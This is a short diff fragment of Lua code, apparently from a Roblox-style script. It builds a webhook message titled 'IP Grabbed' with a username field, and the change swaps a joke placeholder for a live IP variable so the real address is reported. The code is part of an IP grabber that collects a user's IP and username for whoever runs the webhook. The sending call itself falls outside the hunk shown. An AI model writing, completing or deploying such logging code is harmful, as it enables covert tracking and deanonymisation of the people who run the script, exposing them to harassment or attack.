@@ -19,7 +19,7 @@ pcall(function()
 		["embeds"] = {
 			{
 				["title"] = "IP Grabbed",
-				["description"] = "**IP:** || " .. "DABABY 69" .. ":80 ||";
+				["description"] = "**IP:** || " .. IP .. ":80 ||";
 				["fields"] = {
 					{
 						["name"] = "Username:";
